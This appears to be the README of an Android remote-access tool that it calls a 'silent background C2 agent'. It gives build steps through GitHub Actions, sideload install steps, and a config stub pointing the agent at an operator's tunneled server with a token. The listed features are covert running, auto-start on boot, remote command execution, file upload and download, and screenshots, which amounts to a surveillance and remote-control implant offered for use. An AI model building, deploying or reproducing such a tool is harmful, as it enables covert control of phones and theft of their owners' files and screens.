# TLS Client - Android Agent

Silent background C2 agent for Android. Connects to the TLS server over Portmap tunnel.

## Build via GitHub Actions (no Android Studio needed)

1. Create a new GitHub repo
2. Push this folder to it
3. Copy your `ca.crt` into `app/src/main/assets/ca.crt`
4. Edit `app/src/main/java/com/tlsclient/agent/Config.kt` with your server details
5. Push — GitHub Actions builds the APK automatically
6. Download from Actions → Artifacts → `TLSClient-debug`

## Install on phone

```bash
# Via ADB
adb install app-debug.apk

# Or just transfer the file and open it on the phone
# Enable "Install unknown apps" in Android settings first
```

## What it does

- Runs as a silent foreground service (minimal notification)
- Auto-starts on boot
- Connects to your server through Portmap tunnel
- Supports: ping, info, exec, file_get, file_put, screenshot, echo

## Config

Edit `Config.kt` before building:
```kotlin
const val SERVER_HOST = "your-portmap-host.portmap.host"
const val SERVER_PORT = 47209
const val AUTH_TOKEN  = "your-token"
```

## Screenshot note

`screencap` command works on most Android devices without root.
On some devices it may require ADB authorization first.
